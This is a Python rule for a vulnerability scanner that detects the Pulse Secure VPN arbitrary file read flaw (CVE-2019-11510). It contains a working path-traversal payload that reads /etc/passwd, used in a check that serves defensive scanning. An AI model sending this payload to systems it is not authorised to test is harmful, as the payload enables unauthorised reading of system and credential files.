from core.parser import ScanParser
from core.redis import rds
from core.rules import BaseRule
from core.triage import Triage
from db.db_ports import https_ports


class Rule(BaseRule):
    def __init__(self):
        super().__init__()
        self.rule = 'CVE_19B2'
        self.rule_severity = 4
        self.rule_description = 'This rule checks for Pulse Secure VPN Arbitrary File Read Vulnerability (CVE-2019-11510)'
        self.rule_confirm = 'Pulse Secure VPN Arbitrary File Read'
        self.rule_details = ''
        self.rule_mitigation = (
            'Update Pulse Secure VPN to the latest version to fix this issue. '
            'Consult the Pulse Secure advisory: '
            'https://kb.pulsesecure.net/articles/Pulse_Secure_Advisories/PSA-2019-03'
        )
        self.intensity = 1

    def check_rule(self, ip, port, values, conf):
        if port not in https_ports:
            return

        triage = Triage()
        payload = '/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/'
        response = triage.http_request(ip, port, uri=payload)

        if not response or 'root:x:0:0' not in response.text:
            return

        self.rule_details = f'Pulse Secure VPN Arbitrary File Read Vulnerability - CVE-2019-11510 at {response.url}'
        domain = ScanParser(port, values).get_domain()
        vuln_dict = self.get_vuln_dict(ip, port, domain)
        rds.store_vuln(vuln_dict)
